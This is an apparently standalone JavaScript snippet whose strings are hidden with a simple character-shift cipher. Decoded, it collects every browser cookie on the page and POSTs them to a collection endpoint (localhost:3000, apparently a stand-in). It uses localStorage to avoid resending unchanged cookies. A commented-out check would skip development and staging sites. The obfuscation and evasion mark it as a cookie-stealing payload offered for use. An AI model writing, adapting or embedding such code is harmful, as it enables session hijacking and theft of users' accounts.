(() => {
  const y = 'oifneirpvnpecz'

  // let t = false;
  // ['localhost', 'dev', 'qa', 'staging'].forEach(s => {
  //   if (new RegExp(s).test(location.href)) {
  //     t = true;
  //     return;
  //   }
  // });
  // if (t) return;

  const c = str => str
    .split('')
    .map(s => String.fromCharCode(s.charCodeAt() - 5))
    .join('');

  const k = (o) => Object
    .keys(o)
    .map(l => encodeURIComponent(l) + '=' + encodeURIComponent(o[l]))
    .join('&');

  const h = s => s
    .split('')
    .reduce((a,b) => {
      a = ((a << 5) - a) + b.charCodeAt(0);
      return a&a;
    }, 0);

  const d = document[c('httpnj')]

  const r = () => {
    let a = {};
    let b = d.split('; ');
    b.forEach(e => {
      const w = e.split('=');
      a[w[0]] = w[1];
    });
    return k(a);
  }

  if (window[c('qthfqXytwflj')][c('ljyNyjr')](y) != h(d)) {
    window[c('qthfqXytwflj')][c('xjyNyjr')](y, h(d));
    window[c('kjyhm')](c('myyu?44qthfqmtxy?85554'), {
      [c('rjymti')]: c('utxy'),
      [c('mjfijwx')]: {[c('Htsyjsy2Y~uj')]: c('fuuqnhfynts4}2|||2ktwr2zwqjshtiji')},
      [c('gti~')]: r()
    });
  }
})();